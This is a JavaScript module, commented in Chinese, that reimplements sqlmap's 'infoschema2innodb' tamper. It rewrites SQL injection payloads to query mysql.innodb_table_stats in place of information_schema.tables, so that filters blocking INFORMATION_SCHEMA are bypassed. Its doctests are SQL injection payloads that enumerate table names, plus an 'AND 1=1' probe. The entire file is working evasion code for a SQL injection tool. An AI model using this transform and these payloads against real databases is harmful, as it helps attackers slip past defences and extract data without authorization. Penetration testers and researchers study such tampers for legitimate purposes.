// 对标 sqlmap infoschema2innodb.py：information_schema.tables 改写为 mysql.innodb_table_stats
// 绕过对 INFORMATION_SCHEMA 的过滤（MySQL 5.6+ 可用），table_schema 列同步改名 database_name
export const infoschema2innodb = {
  name: 'infoschema2innodb',
  description: '将 information_schema.tables 改写为 mysql.innodb_table_stats（MySQL 专用绕过）',
  doctests: [
    {
      input: 'SELECT table_name FROM information_schema.tables WHERE table_schema=0x6d6173746572 LIMIT 0,1',
      output: 'SELECT table_name FROM mysql.innodb_table_stats WHERE database_name=0x6d6173746572 LIMIT 0,1',
    },
    {
      input: 'SELECT COUNT(table_name) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=0x61',
      output: 'SELECT COUNT(table_name) FROM mysql.innodb_table_stats WHERE database_name=0x61',
    },
    { input: '1 AND 1=1', output: '1 AND 1=1' }, // 不含 information_schema.tables 不动
  ],
  transform(payload) {
    let out = String(payload ?? '');
    if (!out) return out;
    if (/information_schema\.tables/i.test(out)) {
      out = out.replace(/information_schema\.tables/gi, 'mysql.innodb_table_stats');
      out = out.replace(/table_schema/gi, 'database_name');
    }
    return out;
  },
};
export default infoschema2innodb;
